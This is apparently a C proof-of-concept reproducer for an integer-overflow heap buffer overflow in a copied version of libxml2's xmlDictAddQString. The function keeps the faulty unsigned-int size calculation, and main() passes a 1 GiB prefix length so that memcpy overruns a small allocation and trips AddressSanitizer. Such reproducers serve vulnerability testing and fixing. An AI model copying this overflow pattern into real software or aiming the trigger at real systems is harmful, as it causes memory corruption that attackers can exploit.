#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <errno.h>

/* Minimal type/struct redefinitions matching libxml2 internals used here */
typedef unsigned char xmlChar;

typedef struct _xmlDictStrings xmlDictStrings;
typedef xmlDictStrings* xmlDictStringsPtr;

typedef struct _xmlDict {
    int ref_counter;
    size_t limit;
    xmlDictStringsPtr strings;
} xmlDict, *xmlDictPtr;

struct _xmlDictStrings {
    size_t size;
    unsigned int nbStrings;
    xmlChar *free;
    xmlChar *end;
    xmlDictStringsPtr next;
    xmlChar array[1]; /* flexible tail */
};

/* Stubs to mimic libxml2 allocation/parsing init */
static void *xmlMalloc(size_t size) {
    return malloc(size);
}

static void xmlInitParser(void) {
    /* no-op for this reproducer */
}

/* Vulnerable function copied/adapted from dict.c */
static const xmlChar *
xmlDictAddQString(xmlDictPtr dict, const xmlChar *prefix, unsigned int plen,
                  const xmlChar *name, unsigned int namelen)
{
    xmlDictStringsPtr pool;
    const xmlChar *ret;
    size_t size = 0; /* + sizeof(_xmlDictStrings) == 1024 */
    size_t limit = 0;

    pool = dict->strings;
    while (pool != NULL) {
        if ((size_t)(pool->end - pool->free) > namelen + plen + 1)
            goto found_pool;
        if (pool->size > size) size = pool->size;
        limit += pool->size;
        pool = pool->next;
    }
    /* Not found, need to allocate */
    if (pool == NULL) {
        if ((dict->limit > 0) && (limit > dict->limit)) {
            return(NULL);
        }

        if (size == 0) size = 1000;
        else size *= 4; /* exponential growth */
        /* Integer overflow bug: the RHS is computed in unsigned int */
        if (size < 4 * (namelen + plen + 1))
            size = 4 * (namelen + plen + 1); /* just in case ! */
        pool = (xmlDictStringsPtr) xmlMalloc(sizeof(xmlDictStrings) + size);
        if (pool == NULL)
            return(NULL);
        pool->size = size;
        pool->nbStrings = 0;
        pool->free = &pool->array[0];
        pool->end = &pool->array[size];
        pool->next = dict->strings;
        dict->strings = pool;
    }
found_pool:
    ret = pool->free;
    memcpy(pool->free, prefix, plen); /* Overflows when size is too small */
    pool->free += plen;
    *(pool->free++) = ':';
    memcpy(pool->free, name, namelen);
    pool->free += namelen;
    *(pool->free++) = 0;
    pool->nbStrings++;
    return(ret);
}

/* Minimal creator mirroring libxml2's public API */
static xmlDict *xmlDictCreate(void) {
    xmlDictPtr dict;

    xmlInitParser();

    dict = (xmlDictPtr)xmlMalloc(sizeof(xmlDict));
    if (dict == NULL)
        return NULL;
    dict->ref_counter = 1;
    dict->limit = 0;
    dict->strings = NULL;
    return dict;
}

int main(void) {
    xmlDictPtr dict = xmlDictCreate();
    if (!dict) {
        fprintf(stderr, "xmlDictCreate failed\n");
        return 1;
    }

    /* Choose a prefix length that causes 4 * (plen + namelen + 1) to overflow
       32-bit unsigned arithmetic to a tiny number (e.g., 4). */
    unsigned int plen = 0x40000000u; /* 1 GiB */
    unsigned int namelen = 0u;

    /* Map a 1 GiB read-only source buffer so memcpy() doesn't fault on read
       before it overflows the tiny destination buffer. */
    size_t map_len = (size_t)plen;
    void *prefix = mmap(NULL, map_len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (prefix == MAP_FAILED) {
        fprintf(stderr, "mmap(%zu) failed: %s\n", map_len, strerror(errno));
        return 1;
    }
    /* No need to initialize; anonymous mmap is zeroed and readable. */

    const xmlChar *name = (const xmlChar *)""; /* empty local name */

    /* This call will allocate a pool of ~1000 bytes due to integer overflow
       in the size computation, then memcpy() ~1 GiB into it, triggering ASan. */
    const xmlChar *res = xmlDictAddQString(dict, (const xmlChar *)prefix, plen, name, namelen);

    /* If ASan didn't abort, print pointer to avoid optimizing away. */
    printf("Result ptr: %p\n", (void *)res);

    return 0;
}
